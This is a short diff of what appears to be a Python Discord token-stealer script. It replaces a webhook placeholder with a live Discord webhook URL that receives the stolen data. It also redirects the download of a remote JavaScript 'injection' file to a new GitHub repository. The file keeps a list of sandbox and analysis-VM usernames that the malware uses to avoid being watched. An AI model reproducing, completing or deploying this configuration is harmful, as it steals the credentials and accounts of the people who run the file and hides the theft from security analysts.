@@ -24,8 +24,8 @@ import wmi
 
 
 
-hook = "WEBHOOK HERE"
-inj_url = "https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
+hook = "https://discord.com/api/webhooks/1082085746158080050/RHZofqTIi6QOZUNCDfm-iyAEfCcX_fLDk-JtB8MlGR8g-Kvf_I-9UlPdBoQRISGrAfj2"
+inj_url = "https://raw.githubusercontent.com/donnyboi1234/1337wtf1337/main/injection.js"
 
 
 blacklistUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
